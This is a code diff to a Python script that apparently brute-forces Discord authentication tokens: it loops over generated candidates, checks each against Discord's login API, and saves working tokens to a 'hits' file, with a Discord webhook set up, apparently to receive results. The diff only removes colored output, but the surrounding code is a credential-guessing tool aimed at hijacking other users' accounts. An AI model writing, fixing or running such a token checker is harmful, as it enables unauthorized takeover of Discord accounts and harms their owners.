@@ -3,7 +3,7 @@ import os
 import random
 import string
 import requests
-from colorama import *
+import time
 from discord_webhook import DiscordWebhook
 
 # Replace <YOUR_WEBHOOK_URL> with the URL of your Discord webhook
@@ -26,12 +26,12 @@ while id_to_token == id_to_token:
     login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
     try:
         if login.status_code == 200:
-            print(Fore.GREEN + '[+] VALID' + ' ' + token)
+            print('[+] VALID' + ' ' + token)
             # Write the valid token to a file
             with open('hit.txt', 'a+') as f:
                 f.write(f'{token}\n')
         else:
-            print(Fore.RED + '[-] INVALID' + ' ' + token)
+            print('[-] INVALID' + ' ' + token)
     finally:
         print("")
     
